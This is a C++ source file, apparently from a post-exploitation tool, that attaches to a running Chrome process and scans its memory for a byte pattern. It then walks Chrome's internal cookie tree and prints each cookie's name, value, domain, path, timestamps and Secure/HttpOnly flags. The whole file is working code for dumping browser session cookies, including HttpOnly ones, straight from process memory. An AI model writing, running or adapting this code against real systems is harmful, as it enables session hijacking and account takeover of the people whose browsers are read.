#include <Windows.h>
#include <stdio.h>

#include "Helper.h"
#include <string>
#include <map>
#include <memory>
#include <vector>

struct OptimizedString {
    char buf[23];
    UCHAR len;
};

struct RemoteString {
    uintptr_t dataAddress;
    size_t strLen; //This won't include the null terminator
    int strMax; //Maximum string length
    char unk[3]; //I just couldn't figure out the last data type :(
    UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
};

struct CanonicalCookie {
    OptimizedString name;
    OptimizedString value;
    OptimizedString domain;
    OptimizedString path;
    int64_t creation_date;
    int64_t expiry_date;
    int64_t last_access_date;
    int64_t last_update_date;
    bool secure;
    bool httponly;
};

struct Node {
    uintptr_t left;
    uintptr_t right;
    uintptr_t parent;
    bool is_black; //My guess is that data is stored in red-black tree
    char padding[7];
    OptimizedString key;
    uintptr_t valueAddress;
};

struct RootNode {
    uintptr_t beginNode;
    uintptr_t firstNode;
    size_t size;
};

//Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
//Or if it is stored in another address
void ReadString(HANDLE hProcess, OptimizedString string) {

    if (string.len > 23)
    {
        RemoteString longString = { 0 };
        std::memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
#ifdef _DEBUG
            printf("Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
            unsigned char* buf = (unsigned char*)malloc(longString.strMax);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen+1, nullptr)) {
                DebugPrintErrorWithMessage(TEXT("Failed to read cookie value"));
                free(buf);
                return;
            }
            printf("%s\n", buf);
            free(buf);
        }
    }
    else
        printf("%s\n", string.buf);

}

void PrintTimeStamp(int64_t timeStamp) {
    ULONGLONG fileTimeTicks = timeStamp * 10;

    FILETIME fileTime;
    fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
    fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

    SYSTEMTIME systemTime;
    FileTimeToSystemTime(&fileTime, &systemTime);

    printf("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
        systemTime.wYear, systemTime.wMonth, systemTime.wDay,
        systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
}

void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {

    CanonicalCookie cookie = {0};
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie), nullptr))
        PrintErrorWithMessage(TEXT("Failed to read cookie struct"));

    printf("    Name: ");
    ReadString(hProcess, cookie.name);
    printf("    Value: ");
    ReadString(hProcess, cookie.value);
    printf("    Domain: ");
    ReadString(hProcess, cookie.domain);
    printf("    Path: ");
    ReadString(hProcess, cookie.path);
    printf("    Creation time: ");
    PrintTimeStamp(cookie.creation_date);
    printf("    Expiration time: ");
    PrintTimeStamp(cookie.expiry_date);
    printf("    Last accessed: ");
    PrintTimeStamp(cookie.last_access_date);
    printf("    Last updated: ");
    PrintTimeStamp(cookie.last_update_date);
    printf("    Secure: %s\n", cookie.secure ? "True" : "False");
    printf("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    printf("\n");
}

void ProcessNode(HANDLE hProcess, const Node& node) {
    // Process the current node
    printf("Cookie Key: ");
    ReadString(hProcess, node.key);

#ifdef _DEBUG
    printf("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
#endif
    ProcessNodeValue(hProcess, node.valueAddress);

    // Process the left child if it exists
    if (node.left != 0) {
        Node leftNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, leftNode);
        else
            PrintErrorWithMessage(TEXT("Error reading left node"));
    }

    // Process the right child if it exists
    if (node.right != 0) {
        Node rightNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
            ProcessNode(hProcess, rightNode);
        else
            PrintErrorWithMessage(TEXT("Error reading right node"));
    }
}

void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress) {

    RootNode cookieMap;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
        PrintErrorWithMessage(TEXT("Failed to read the root node from given address\n"));
        return;
    }

    // Process the root node
#ifdef _DEBUG
    printf("Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
    printf("Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
    printf("Size of the cookie map: %zu\n", cookieMap.size);
#endif // _DEBUG

    printf("[*] Number of available cookies: %zu\n\n", cookieMap.size);
    // Process the first node in the binary search tree
    Node firstNode;
    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr))
        ProcessNode(hProcess, firstNode);
    else
        PrintErrorWithMessage(TEXT("Error reading first node"));
}

BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t& resultAddress) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

    MEMORY_BASIC_INFORMATION memoryInfo;

    int hitcount = 0;
    while (startAddress < endAddress) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE)) != 0) {
                BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                SIZE_T bytesRead;

                if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                    for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                        if (memcmp(buffer + i, pattern, patternSize) == 0) {
                            if (hitcount > 0)
                            {
                                resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                                uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
#ifdef _DEBUG
                                printf("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                    memoryInfo.AllocationBase,
                                    memoryInfo.BaseAddress,
                                    offset);
#endif
                                delete[] buffer;
                                return TRUE;
                            }
                            hitcount++;
                        }
                    }
                }
                else {
                    //This happens quite a lot, will not print these errors on release build
                    DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                }

                delete[] buffer;
            }

            startAddress += memoryInfo.RegionSize;
        }
        else {
            DebugPrintErrorWithMessage(TEXT("VirtualQueryEx failed\n"));
            break;  // VirtualQueryEx failed
        }
    }

    return FALSE;
}